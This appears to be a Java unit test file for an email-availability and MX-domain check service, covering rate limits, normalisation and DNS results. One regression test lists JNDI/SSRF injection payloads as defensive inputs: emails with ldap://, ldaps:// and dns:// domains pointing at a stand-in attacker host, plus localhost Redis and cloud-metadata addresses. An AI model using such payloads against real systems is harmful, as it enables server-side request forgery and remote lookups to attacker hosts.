package com.renaser.os.users.application.services;

import com.renaser.os.shared.domain.RateLimitExceededException;
import com.renaser.os.users.application.ports.in.accountrequest.VerificarDominioEmailUseCase.MotivoNoEntregable;
import com.renaser.os.users.application.ports.out.accountrequest.LoadAccountRequestPort;
import com.renaser.os.users.application.ports.out.accountrequest.ResolverMxPort;
import com.renaser.os.users.application.ports.out.accountrequest.ResolverMxPort.ResultadoMx;
import com.renaser.os.users.application.ports.out.autenticacion.LimitarSolicitudesResetPort;
import com.renaser.os.users.application.ports.out.user.LoadUserPort;
import com.renaser.os.users.domain.model.user.Email;
import com.renaser.os.users.domain.model.user.User;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import java.util.Optional;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyInt;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.BDDMockito.given;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;

/** Unit puro: los cuatro puertos mockeados, sin Spring, sin base, sin DNS real. */
@ExtendWith(MockitoExtension.class)
class ConsultaEmailServiceTest {

    private static final String EMAIL = "aprendiz@ejemplo.test";
    private static final String IP = "203.0.113.7";

    @Mock
    private LoadUserPort loadUserPort;
    @Mock
    private LoadAccountRequestPort loadAccountRequestPort;
    @Mock
    private LimitarSolicitudesResetPort limitarSolicitudesPort;
    @Mock
    private ResolverMxPort resolverMxPort;

    private ConsultaEmailService service;

    @BeforeEach
    void setUp() {
        service = new ConsultaEmailService(loadUserPort, loadAccountRequestPort, limitarSolicitudesPort,
                resolverMxPort);
    }

    private void conMargenDeCuota() {
        given(limitarSolicitudesPort.registrarIntento(anyString(), any(), anyInt())).willReturn(true);
    }

    @Nested
    @DisplayName("estaRegistrado")
    class EstaRegistrado {

        @Test
        @DisplayName("un correo con usuario ya registrado da true sin llegar a mirar las solicitudes")
        void detectaUsuarioExistente(@Mock User usuarioExistente) {
            conMargenDeCuota();
            given(loadUserPort.byEmail(new Email(EMAIL))).willReturn(Optional.of(usuarioExistente));

            assertThat(service.estaRegistrado(EMAIL, IP)).isTrue();
            // Corto circuito: si ya hay usuario, la segunda consulta ni se hace.
            verify(loadAccountRequestPort, never()).existePorEmail(any());
        }

        @Test
        @DisplayName("una solicitud pendiente tambien ocupa el correo, aunque no haya usuario todavia")
        void detectaSolicitudPendiente() {
            conMargenDeCuota();
            given(loadUserPort.byEmail(new Email(EMAIL))).willReturn(Optional.empty());
            given(loadAccountRequestPort.existePorEmail(new Email(EMAIL))).willReturn(true);

            assertThat(service.estaRegistrado(EMAIL, IP)).isTrue();
        }

        @Test
        @DisplayName("sin usuario ni solicitud, el correo esta libre")
        void correoLibre() {
            conMargenDeCuota();
            given(loadUserPort.byEmail(new Email(EMAIL))).willReturn(Optional.empty());
            given(loadAccountRequestPort.existePorEmail(new Email(EMAIL))).willReturn(false);

            assertThat(service.estaRegistrado(EMAIL, IP)).isFalse();
        }

        @Test
        @DisplayName("el correo se normaliza antes de consultar: mayusculas y espacios no crean un caso nuevo")
        void normalizaAntesDeConsultar() {
            conMargenDeCuota();
            given(loadUserPort.byEmail(new Email(EMAIL))).willReturn(Optional.empty());
            given(loadAccountRequestPort.existePorEmail(new Email(EMAIL))).willReturn(true);

            assertThat(service.estaRegistrado("  APRENDIZ@Ejemplo.Test  ", IP)).isTrue();
        }

        @Test
        @DisplayName("un correo mal formado se rechaza SIN tocar la base: media defensa contra el sondeo")
        void formatoInvalidoNoConsultaLaBase() {
            conMargenDeCuota();

            assertThatThrownBy(() -> service.estaRegistrado("no-es-un-correo", IP))
                    .isInstanceOf(IllegalArgumentException.class);

            verify(loadUserPort, never()).byEmail(any());
            verify(loadAccountRequestPort, never()).existePorEmail(any());
        }

        @Test
        @DisplayName("pasado el limite por IP se corta antes de consultar, no despues")
        void cortaAlSuperarElLimitePorIp() {
            given(limitarSolicitudesPort.registrarIntento("email-check:ip:" + IP,
                    ConsultaEmailService.VENTANA_RATE_LIMIT,
                    ConsultaEmailService.LIMITE_CONSULTAS_POR_IP)).willReturn(false);

            assertThatThrownBy(() -> service.estaRegistrado(EMAIL, IP))
                    .isInstanceOf(RateLimitExceededException.class);

            verify(loadUserPort, never()).byEmail(any());
        }

        @Test
        @DisplayName("sin IP conocida la consulta sigue funcionando: no se puede contar, no se bloquea")
        void sinIpNoSeLimita() {
            given(loadUserPort.byEmail(new Email(EMAIL))).willReturn(Optional.empty());
            given(loadAccountRequestPort.existePorEmail(new Email(EMAIL))).willReturn(false);

            assertThat(service.estaRegistrado(EMAIL, null)).isFalse();

            verify(limitarSolicitudesPort, never()).registrarIntento(anyString(), any(), anyInt());
        }
    }

    @Nested
    @DisplayName("verificar dominio")
    class VerificarDominio {

        @Test
        @DisplayName("con MX el dominio puede recibir correo")
        void conMx() {
            conMargenDeCuota();
            given(resolverMxPort.consultar("ejemplo.test")).willReturn(ResultadoMx.TIENE_MX);

            var resultado = service.verificar(EMAIL, IP);

            assertThat(resultado.entregable()).isTrue();
            assertThat(resultado.motivo()).isNull();
        }

        @Test
        @DisplayName("sin MX no es entregable, y se dice por que")
        void sinMx() {
            conMargenDeCuota();
            given(resolverMxPort.consultar("ejemplo.test")).willReturn(ResultadoMx.SIN_MX);

            var resultado = service.verificar(EMAIL, IP);

            assertThat(resultado.entregable()).isFalse();
            assertThat(resultado.motivo()).isEqualTo(MotivoNoEntregable.SIN_MX);
        }

        @Test
        @DisplayName("un dominio inexistente se distingue de uno sin MX")
        void dominioInexistente() {
            conMargenDeCuota();
            given(resolverMxPort.consultar("ejemplo.test")).willReturn(ResultadoMx.DOMINIO_INEXISTENTE);

            assertThat(service.verificar(EMAIL, IP).motivo()).isEqualTo(MotivoNoEntregable.DOMINIO_INEXISTENTE);
        }

        @Test
        @DisplayName("si el DNS no responde, NO se convierte en un 'no': queda indeterminado")
        void dnsCaidoNoEsUnNo() {
            conMargenDeCuota();
            given(resolverMxPort.consultar("ejemplo.test")).willReturn(ResultadoMx.INDETERMINADO);

            var resultado = service.verificar(EMAIL, IP);

            assertThat(resultado.entregable()).isNull();
            assertThat(resultado.motivo()).isNull();
        }

        @Test
        @DisplayName("un correo mal formado responde 'formato' sin consultar DNS y sin gastar cupo")
        void formatoInvalido() {
            var resultado = service.verificar("no-es-un-correo", IP);

            assertThat(resultado.entregable()).isFalse();
            assertThat(resultado.motivo()).isEqualTo(MotivoNoEntregable.FORMATO);
            verify(resolverMxPort, never()).consultar(anyString());
            // El cupo raciona la salida a la red, y este camino no sale: se responde con un
            // regex. Cobrarselo le gastaria el cupo a quien se equivoca escribiendo su correo.
            verify(limitarSolicitudesPort, never()).registrarIntento(anyString(), any(), anyInt());
        }

        /**
         * Regresion del hallazgo del nombre JNDI. Este es el camino publico completo
         * (POST /api/v1/account-requests/verify-email, sin sesion): antes, la parte de dominio de
         * estos correos bajaba entera hasta el resolvedor y de ahi al interprete JNDI, que salia a
         * conectarse al host y al puerto que eligio quien escribio el correo. Lo que se exige aca
         * es que el puerto NO se llame: si se llamara, el destino de la conexion volveria a
         * elegirlo el cliente.
         */
        @ParameterizedTest
        @ValueSource(strings = {
                "a@ldap://baliza.ejemplo-del-atacante.tld:1389/x",
                "a@ldaps://baliza.ejemplo-del-atacante.tld:8443/x",
                "a@dns://baliza.ejemplo-del-atacante.tld:5353/x.y",
                "a@ldap://127.0.0.1:6379/aa",
                "a@ldap://169.254.169.254:80/aa"
        })
        @DisplayName("un dominio con forma de URL se responde 'formato' y no llega al resolvedor")
        void dominioConFormaDeUrlNoLlegaAlResolvedor(String conFormaDeUrl) {
            var resultado = service.verificar(conFormaDeUrl, IP);

            assertThat(resultado.entregable()).isFalse();
            assertThat(resultado.motivo()).isEqualTo(MotivoNoEntregable.FORMATO);
            verify(resolverMxPort, never()).consultar(anyString());
        }

        /**
         * <b>Esta prueba estaba al reves hasta el 2026-09-21, y se invirtio a proposito.</b> Se
         * llamaba {@code noConsumeCuota}, se titulaba <i>"verificar el dominio no consume cuota:
         * no manda correo ni toca la base"</i> y afirmaba que {@code registrarIntento} no se
         * llamaba NUNCA.
         *
         * <p>Su titulo decia la verdad sobre dos recursos y se olvidaba del tercero: es cierto que
         * este camino no manda correo y no toca la base, pero <b>sale de la maquina</b> — consulta
         * el DNS de un nombre que elige quien llama, sin cache que lo absorba. Con esa cuenta, el
         * unico de los tres endpoints publicos de correo que cuesta un viaje de red quedo siendo
         * el unico sin tope, mientras sus dos hermanos —que cuestan una lectura local— si lo
         * tenian. Y como estaba escrita como prueba, ponerle el tope dejaba la suite en rojo: la
         * ausencia del control estaba fijada, no olvidada.
         *
         * <p>Lo que se exige ahora es lo contrario, y es lo que hay que sostener: pasado el tope,
         * el resolvedor <b>no se llama ni una vez</b>. Contar las llamadas al puerto —y no
         * conformarse con la excepcion— es lo que la pone roja si alguien vuelve a mover el cupo
         * a despues de la consulta.
         */
        @Test
        @DisplayName("pasado el limite por IP el DNS no se consulta ni una vez: salir a la red cuesta cupo")
        void cortaAntesDeSalirALaRed() {
            given(limitarSolicitudesPort.registrarIntento("email-mx:ip:" + IP,
                    ConsultaEmailService.VENTANA_RATE_LIMIT,
                    ConsultaEmailService.LIMITE_MX_POR_IP)).willReturn(false);

            assertThatThrownBy(() -> service.verificar(EMAIL, IP))
                    .isInstanceOf(RateLimitExceededException.class);

            verify(resolverMxPort, never()).consultar(anyString());
        }

        /**
         * La otra mitad del mismo arreglo: que el cupo se gaste de verdad y en SU contador. Si
         * compartiera clave con {@code email-check:ip:}, teclear el correo en el formulario
         * —que consulta ese otro endpoint en cada tecla— dejaria sin verificacion de dominio a
         * quien esta por registrarse, que es el uso legitimo de este.
         */
        @Test
        @DisplayName("una consulta que sale a la red gasta cupo, y del contador del MX")
        void gastaCupoDeSuPropioContador() {
            conMargenDeCuota();
            given(resolverMxPort.consultar("ejemplo.test")).willReturn(ResultadoMx.TIENE_MX);

            service.verificar(EMAIL, IP);

            verify(limitarSolicitudesPort).registrarIntento("email-mx:ip:" + IP,
                    ConsultaEmailService.VENTANA_RATE_LIMIT, ConsultaEmailService.LIMITE_MX_POR_IP);
        }

        /**
         * Mismo criterio que {@code estaRegistrado} y que el resto del modulo: un contador que no
         * sabe a quien contarle no bloquea a nadie, porque bloquearia a todos. Por el camino HTTP
         * real la IP siempre viene — la pone el controller.
         */
        @Test
        @DisplayName("sin IP conocida se consulta igual: no se puede contar, no se bloquea")
        void sinIpNoSeLimitaPeroSeConsultaIgual() {
            given(resolverMxPort.consultar("ejemplo.test")).willReturn(ResultadoMx.TIENE_MX);

            assertThat(service.verificar(EMAIL, null).entregable()).isTrue();

            verify(limitarSolicitudesPort, never()).registrarIntento(anyString(), any(), anyInt());
        }
    }
}
